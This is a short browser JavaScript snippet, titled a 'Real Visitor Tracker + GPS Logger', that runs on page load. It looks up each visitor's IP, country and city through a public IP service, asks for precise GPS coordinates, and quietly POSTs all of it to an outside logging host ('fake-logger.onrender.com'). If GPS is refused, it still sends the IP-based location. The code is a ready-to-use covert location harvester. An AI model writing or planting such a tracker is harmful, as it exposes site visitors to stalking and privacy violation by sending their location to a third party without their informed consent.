// 🔒 Real Visitor Tracker + GPS Logger
(async () => {
  let ip = "Unknown", country = "Unknown", city = "Unknown";
  let latitude = "N/A", longitude = "N/A";

  try {
    // Get public IP & location via IPAPI
    const ipRes = await fetch("https://ipapi.co/json/");
    const ipData = await ipRes.json();
    ip = ipData.ip || ip;
    country = ipData.country_name || country;
    city = ipData.city || city;
  } catch (err) {
    console.warn("IP fetch failed", err);
  }

  // Try to get exact GPS location (with permission)
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(success, error, {
      enableHighAccuracy: true,
      timeout: 5000,
      maximumAge: 0
    });
  } else {
    sendLog(); // fallback if GPS not supported
  }

  function success(pos) {
    latitude = pos.coords.latitude;
    longitude = pos.coords.longitude;
    sendLog();
  }

  function error(err) {
    console.warn("GPS blocked", err.message);
    sendLog(); // still log IP-based info
  }

  function sendLog() {
    const payload = {
      ip,
      country,
      city,
      latitude,
      longitude
    };

    fetch("https://fake-logger.onrender.com/logger.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    }).catch(err => console.error("Log failed:", err));
  }
})();
